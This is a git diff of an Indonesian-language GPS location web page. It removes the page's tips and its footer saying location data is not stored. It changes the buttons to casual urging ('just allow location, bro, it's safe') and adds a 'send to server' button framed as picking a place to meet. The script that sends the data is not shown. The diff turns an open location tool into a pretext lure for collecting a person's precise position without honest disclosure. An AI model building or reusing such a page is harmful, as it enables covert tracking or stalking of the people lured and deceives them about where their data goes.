@@ -14,7 +14,7 @@
         </header>
 
         <main>
-            <!-- Tips Section -->
+            <!-- Tips Section
             <div class="tips-section">
                 <h3>💡 Tips Mendapatkan Lokasi GPS yang Akurat:</h3>
                 <ul>
@@ -23,24 +23,24 @@
                     <li>📍 GPS memberikan akurasi ±10-100 meter</li>
                     <li>⚠️ Jika gagal/lama, coba klik tombol lagi atau refresh halaman</li>
                 </ul>
-            </div>
+            </div> -->
 
             <div class="action-section">
                 <button id="getLocationBtn" class="btn-primary">
-                    <span class="btn-icon">📍</span>
-                    Dapatkan Lokasi GPS (Akurat)
+                    <span class="btn-icon"></span>
+                    cek sini, lokasi nya izinin aja oss. aman
                 </button>
             </div>
 
             <div id="loadingIndicator" class="loading hidden">
                 <div class="spinner"></div>
-                <p>Mendapatkan lokasi Anda...</p>
+                <p>cek..</p>
             </div>
 
             <div id="errorMessage" class="error-message hidden"></div>
 
             <div id="locationInfo" class="location-info hidden">
-                <h2>Informasi Lokasi Anda</h2>
+                <h2></h2>
                 <div class="info-grid">
                     <div class="info-card">
                         <div class="info-label">Latitude</div>
@@ -66,20 +66,19 @@
                     <div id="map"></div>
                 </div>
 
-                <!-- Rekomendasi berdasarkan lokasi -->
-                <div class="recommendations">
-                    <h3>🎯 Rekomendasi Berdasarkan Lokasi</h3>
-                    <div id="recommendationsList">
-                        <!-- Akan diisi oleh JavaScript -->
-                    </div>
+                <!-- Tombol Kirim ke Server -->
+                <div style="margin-top: 20px; text-align: center;">
+                    <button onclick="sendLocationToServer(event)" class="btn-primary" style="font-size: 1.1em; padding: 15px 30px;">
+                    sini buat nentuin lokasi yang pas buat ketemu
+                    </button>
                 </div>
             </div>
         </main>
 
-        <footer>
+        <!-- <footer>
             <p>💡 Aplikasi ini menggunakan HTML5 Geolocation API untuk mendapatkan lokasi Anda</p>
             <p>Data lokasi Anda tidak disimpan dan hanya digunakan untuk meningkatkan pengalaman Anda</p>
-        </footer>
+        </footer> -->
     </div>
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
